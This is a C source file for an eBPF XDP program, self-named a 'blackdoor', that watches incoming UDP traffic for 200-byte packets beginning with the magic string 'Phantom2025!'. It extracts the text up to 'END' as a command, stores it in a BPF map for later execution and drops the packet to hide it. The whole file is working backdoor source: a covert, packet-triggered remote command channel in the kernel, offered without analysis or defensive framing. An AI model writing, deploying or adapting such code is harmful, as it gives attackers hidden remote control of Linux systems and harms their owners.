#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <bpf/bpf_endian.h>
#define ETH_P_IP 0x0800
#define IPPROTO_UDP 17
#define START_PAYLOAD "Phantom2025!"
#define END_PAYLOAD "END"
#define XDP_PASS 2
#define XDP_DROP 1
#define PAYLOAD_SIXE  200
#define CMD_SIZE 100
#define START_LEN (sizeof(START_PAYLOAD) - 1)
#define END_LEN (sizeof(END_PAYLOAD) - 1)

struct blackdoor_command
{
	char cmd[CMD_SIZE];
	__u32 processed;
};
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);
    __type(value, struct blackdoor_command);
    __uint(max_entries, 10);
} commands SEC(".maps");

static __always_inline int my_strncmp(const char *s1, const char *s2, int n) {
    #pragma clang loop unroll(full)
    for (int i = 0; i < n; i++) {
        if (s1[i] != s2[i])
            return 1;
        if (s1[i] == 0)
            break;
    }
    return 0;
}

SEC("xdp")
int blackdoor_s1mple(struct xdp_md *ctx) {
    void *data_end = (void *)(long)ctx->data_end;
    void *data = (void *)(long)ctx->data;
    
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct udphdr) > data_end) {
        return XDP_PASS;
    }
	struct ethhdr *eth = data;  
    
    if (eth->h_proto != bpf_htons(ETH_P_IP)) {
        return XDP_PASS;
    }
    struct iphdr *ip = (struct iphdr *)(eth + 1);
    
    if (ip->protocol != IPPROTO_UDP) {
        return XDP_PASS;
    }
    struct udphdr *udp = (struct udphdr *)(ip + 1);
	int data_and_udphead_len =  bpf_ntohs(udp -> len);
	if (data_and_udphead_len < sizeof(struct udphdr)) {
        return XDP_PASS;
    }
	if ((void *)(udp + 1) + PAYLOAD_SIXE > data_end)
	{
		return XDP_PASS;
	}
	int payload_len = data_and_udphead_len - sizeof(struct udphdr);
	if (payload_len != PAYLOAD_SIXE)
	{
		return XDP_PASS;
	}
	char *payload = (char *)(udp + 1);
	if (my_strncmp(payload, START_PAYLOAD, START_LEN) != 0) {
        return XDP_PASS;
    }
	
	int end_pos = -1 ;
	for (int i = START_LEN; i <= payload_len - END_LEN; i++) {
    if (payload[i] == 'E' && 
        payload[i + 1] == 'N' && 
        payload[i + 2] == 'D') {
        end_pos = i;
        break;
    }
}
	if (end_pos == -1)
	{
		return XDP_PASS;
	}
	char fmt1[] = "[blackdoor] Found activation packet! END at position: %d";
	bpf_trace_printk(fmt1, sizeof(fmt1), end_pos);
    int cmd_start = START_LEN;
    int cmd_len = end_pos - cmd_start;
    
    if (cmd_len <= 0 || cmd_len >= CMD_SIZE) {
        return XDP_PASS;
    }
    
    __u32 key = 0;
    struct blackdoor_command cmd = {};
    
    #pragma clang loop unroll(full)
    for (int i = 0; i < cmd_len && i < CMD_SIZE - 1; i++) {
        cmd.cmd[i] = payload[cmd_start + i];
    }
    cmd.cmd[cmd_len] = '\0';
    cmd.processed = 0;
    char fmt2[] = "[blackdoor] Extracted command: %s";
	bpf_trace_printk(fmt2, sizeof(fmt2), cmd.cmd);
    bpf_map_update_elem(&commands, &key, &cmd, BPF_ANY);
    return XDP_DROP;
	
}
char _license[] SEC("license") = "GPL";